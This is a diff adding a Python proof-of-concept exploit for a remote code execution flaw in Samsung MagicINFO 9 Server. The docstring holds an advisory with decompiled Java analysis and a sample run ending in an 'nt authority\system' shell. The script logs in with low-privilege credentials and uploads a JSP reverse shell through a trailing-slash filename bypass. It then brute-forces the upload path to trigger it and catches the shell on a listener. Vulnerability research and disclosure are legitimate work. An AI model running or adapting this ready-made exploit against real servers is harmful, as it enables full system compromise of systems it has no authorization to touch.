@@ -1,0 +1,264 @@
+#!/usr/bin/env python3
+"""
+Samsung MagicINFO 9 Server MagicInfoWebAuthorClient ContentSaveServiceImpl writeXmlToFile File Write Remote Code Execution Vulnerability
+Download: https://www.magicinfoservices.com/magicinfo-software?submissionGuid=4163dba5-9096-43b4-9ca0-27696e8b70b8
+File: MagicInfo 9 Server 21.1080.0 Setup.zip
+Release date: 5/8/2025
+CVSS: 8.8 (/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
+SHA1: 9744711fe76e7531f128835bf83c9ae001069115
+Install guide: https://docs.samsungvx.com/docs/pages/viewpage.action?pageId=60034270
+Found by: Steven Seeley of Source Incite
+
+# Summary
+
+A low privileged user (any user) can write a backdoor and gain remote code execution against the system. Note that the authentication mechanism can be bypassed by chaining other vulnerabilities
+
+# Analysis
+
+Inside of the `MagicInfoWebAuthorClient` web application, we can see the following mapping inside of the `com.samsung.magicinfo.webauthor2.webapi.controller.ContentSaveController` class:
+
+```java
+/*     */   @PostMapping({"/fileItems"})
+/*     */   public HttpEntity<List<MediaSource>> mapFileItems(@RequestBody FileItemsDescriptor fileItemsDescriptor, HttpServletRequest request) {
+/*  84 */     if (false == validateFileNameNotToMoveIntoUpperFolder(fileItemsDescriptor.getMediaSources()).booleanValue()) {
+/*  85 */       List<MediaSource> empty = new ArrayList<MediaSource>();
+/*  86 */       return ResponseEntity.badRequest().body(empty);
+/*     */     } 
+/*  88 */     this.contentSaveService.saveProjectProperties(fileItemsDescriptor);
+/*  89 */     List<MediaSource> filledMediaSources = this.contentSaveService.getFilledMediaSources(fileItemsDescriptor, request); // 1
+/*  90 */     List<MediaSource> updatedMediaSources = this.contentSaveService.getUpdatedMediaSources(filledMediaSources);
+/*  91 */     return ResponseEntity.ok(updatedMediaSources);
+/*     */   }
+```
+
+At [1] the code calls `getFilledMediaSources` with an attacker controlled `FileItemsDescriptor` instance, Inside of the `com.samsung.magicinfo.webauthor2.service.ContentSaveServiceImpl` class we see:
+
+```java
+/*     */   public List<MediaSource> getFilledMediaSources(FileItemsDescriptor fileItemsDescriptor, HttpServletRequest request) {
+/*  77 */     List<MediaSource> mediaSources = fileItemsDescriptor.getMediaSources();
+/*  78 */     String errorMessage = null;
+/*  79 */     errorMessage = validateInvalidFileName(mediaSources);
+/*  80 */     if (!Strings.isNullOrEmpty(errorMessage))
+/*     */     {
+/*  82 */       throw new FileItemValidationException(500, errorMessage);
+/*     */     }
+/*  84 */     this.serverUrl = getURLWithContextPath(request);
+/*  85 */     fillLftOrLfdInfo((MediaSource)mediaSources.get(0)); // 2
+/*  86 */     for (ListIterator<MediaSource> iter = mediaSources.listIterator(1); iter.hasNext();) {
+/*  87 */       fillMissingInfoInContents((MediaSource)iter.next());
+/*     */     }
+/*  89 */     addThumbnailMediaSource();
+/*  90 */     this.contentSaveElements.setMediaSources(mediaSources);
+/*  91 */     updateXmlProjectedSize(mediaSources);
+/*  92 */     return mediaSources;
+/*     */   }
+```
+
+At [2] the code calls the method `fillLftOrLfdInfo`:
+
+```java
+/*     */   private void fillLftOrLfdInfo(MediaSource mediaSource) {
+/*     */     try {
+/* 186 */       String xml = this.contentSaveElements.getXml();
+/* 187 */       Path xmlPath = writeXmlToFile(this.contentSaveElements.getProjectName(), xml); // 3
+/* 188 */       mediaSource.setPath(xmlPath.toString());
+/* 189 */       fillHash(mediaSource, xmlPath);
+/* 190 */       fillLength(mediaSource, xmlPath);
+/* 191 */       mediaSource.setMediaWidth(this.contentSaveElements.getWidth());
+/* 192 */       mediaSource.setMediaHeight(this.contentSaveElements.getHeight());
+/* 193 */       mediaSource.setMediaDuration(PlayTimeUtil.convertPlayTime(this.contentSaveElements.getPlayTime()).doubleValue());
+/* 194 */       fillFileType(mediaSource);
+/* 195 */       fillMediaType(mediaSource);
+/* 196 */       if (Strings.isNullOrEmpty(mediaSource.getFileId())) {
+/* 197 */         mediaSource.setFileId("00000000-0000-0000-0000-000000000000");
+/*     */       }
+/* 199 */     } catch (IOException e) {
+/* 200 */       logger.error("Error during setting xml media source properties: id {}", mediaSource.getContentId());
+/*     */     } 
+/*     */   }
+```
+
+At [3] the call to `writeXmlToFile` is triggered with the attacker controlled filename and controlled xml:
+
+```java
+/*     */   private Path writeXmlToFile(String projectName, String xml) throws IOException {
+/* 209 */     String insertContents = this.servletContext.getRealPath("insertContents");
+/* 210 */     String userWorkspaceDirectory = this.userData.getWorkspaceFolderName();
+/* 211 */     Path xmlPath = Paths.get(insertContents, new String[] { userWorkspaceDirectory, projectName }); // 4
+/* 212 */     if (Files.exists(xmlPath, new java.nio.file.LinkOption[0])) {
+/* 213 */       FileUtils.deleteQuietly(xmlPath.toFile());
+/*     */     }
+/* 215 */     FileUtils.writeStringToFile(xmlPath.toFile(), xml, StandardCharsets.UTF_8);
+/* 216 */     return xmlPath;
+/*     */   }
+```
+
+At [4] the code calls `Paths.get` which will strip the forward slash at the end that we used to bypass the `validateInvalidFileName` method! This means the attacker can drop a JSP file and gain remote code execution. 
+As far as I know, this technique has never been published so I'm sharing it here for the first time.
+
+# Proof of Concept
+
+```
+researcher@universe:~/0d$ ./poc.py
+(+) usage: ./poc.py <target> <usr:pwd> <connectback>
+(+) eg: ./poc.py 192.168.18.136 lowpriv:mypassword1 192.168.18.137
+researcher@universe:~/0d$ ./poc.py 192.168.18.136 lowpriv:mypassword1 172.20.210.49
+(+) grabbed the token: JDliMTI2MGMxZjhmOTcyNzIkdA==
+(+) starting handler on port 1337
+(+) uploaded the shell, finding it...!
+(+) connection from 172.20.208.1
+(+) pop thy shell!
+Microsoft Windows [Version 10.0.17763.7558]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\MagicInfo Premium\tomcat\bin>whoami
+whoami
+nt authority\system
+
+C:\MagicInfo Premium\tomcat\bin>
+```
+"""
+import sys
+import string
+import random
+import requests
+import socket
+import urllib3
+from threading import Thread
+from telnetlib import Telnet
+from datetime import datetime, timezone
+from colorama import Fore, Style
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def generate_random_string(size=8, chars=string.ascii_uppercase + string.digits):
+    return ''.join(random.choice(chars) for _ in range(size))
+
+def get_jsp(ls, lp):
+    jsp = f"""<%@page import="java.lang.*"%>
+<%@page import="java.util.*"%>
+<%@page import="java.io.*"%>
+<%@page import="java.net.*"%>
+<%
+  class StreamConnector extends Thread
+  {{
+    InputStream sv;
+    OutputStream tp;
+    StreamConnector( InputStream sv, OutputStream tp )
+    {{
+      this.sv = sv;
+      this.tp = tp;
+    }}
+    public void run()
+    {{
+      BufferedReader za  = null;
+      BufferedWriter hjr = null;
+      try
+      {{
+        za  = new BufferedReader( new InputStreamReader( this.sv ) );
+        hjr = new BufferedWriter( new OutputStreamWriter( this.tp ) );
+        char buffer[] = new char[8192];
+        int length;
+        while( ( length = za.read( buffer, 0, buffer.length ) ) > 0 )
+        {{
+          hjr.write( buffer, 0, length );
+          hjr.flush();
+        }}
+      }} catch( Exception e ){{}}
+      try
+      {{
+        if( za != null )
+          za.close();
+        if( hjr != null )
+          hjr.close();
+      }} catch( Exception e ){{}}
+    }}
+  }}
+  try
+  {{
+    String ShellPath = new String("cmd.exe");
+    Socket socket = new Socket("{ls}", {lp});
+    Process process = Runtime.getRuntime().exec( ShellPath );
+    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
+    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
+  }} catch( Exception e ) {{}}
+%>"""
+    return jsp
+
+# only need a low priv user here
+def token_grab(t, usr, pwd):
+    uri = f"https://{t}:7002/MagicInfoWebAuthorClient/main"
+    p = {
+        "username": usr,
+        "password": pwd,
+    }
+    r = requests.post(uri, params=p, headers={"accept":"application/json"}, verify=False)
+    t = r.json()['token']
+    assert t, "(-) unable to login and grab the token!"
+    return t
+
+def upload(t, tkn, shellcode, shell):
+    j = {
+        "mediaSources":[
+            {
+                "data":"pwn",
+                "contentName":"test",
+                "fileName":f"{shell}.jsp/"  # magick
+            }
+        ],
+        "xml": shellcode,
+        "playerType":"iPLAYER",
+        "playTime":1337,
+        "width":1337,
+        "height":1337
+    }
+    uri = f"https://{t}:7002/MagicInfoWebAuthorClient/save/fileItems"
+    r = requests.post(uri, json=j, headers={"accept":"application/json", "cookie":f";user={tkn}"}, verify=False)
+    assert r.status_code == 500, "(-) upload failed, need a 500 response"
+    return r.headers['date'][:-4]
+
+def trigger_rce(t, d, s):
+    datetime_object = datetime.strptime(d, '%a, %d %b %Y %H:%M:%S')
+    res = int(datetime_object.replace(tzinfo=timezone.utc).timestamp())
+    # this is super conservative
+    for i in range((res-1) * 1000, ((res-1) * 1000) + 2000):
+        uri = f"https://{t}:7002/MagicInfoWebAuthorClient/insertContents/_{i}/{s}.jsp"
+        requests.get(uri, verify=False)
+
+def handler(lp):
+    print(f"(+) starting handler on port {lp}")
+    t = Telnet()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0", lp))
+    s.listen(1)
+    conn, addr = s.accept()
+    print(f"(+) connection from {addr[0]}")
+    t.sock = conn
+    print(f"(+) {Fore.RED + Style.BRIGHT}pop thy shell!{Style.RESET_ALL}")
+    t.interact()
+
+def main():
+    if len(sys.argv) != 4:
+        print("(+) usage: %s <target> <usr:pwd> <connectback>" % sys.argv[0])
+        print("(+) eg: %s 192.168.18.136 lowpriv:mypassword1 192.168.18.137" % sys.argv[0])
+        sys.exit(1)
+    t = sys.argv[1]
+    c = sys.argv[2]
+    assert ":" in sys.argv[2], "(-) user credentials are not in the proper format"
+    usr, pwd = sys.argv[2].split(":")
+    h = sys.argv[3]
+    p = 1337
+    if ":" in sys.argv[3]:
+        p = int(sys.argv[3].split(":")[1])
+        h = sys.argv[3].split(":")[0]
+    shell = generate_random_string()
+    shellcode = get_jsp(h, p)
+    tkn = token_grab(t, usr, pwd)
+    print(f"(+) grabbed the token: {tkn}")
+    uploadtime = upload(t, tkn, shellcode, shell)
+    handlerthr = Thread(target=handler, args=[p])
+    handlerthr.start()
+    print("(+) uploaded the shell, finding it...!")
+    trigger_rce(t, uploadtime, shell)
+    
+if __name__ == "__main__":
+    main()
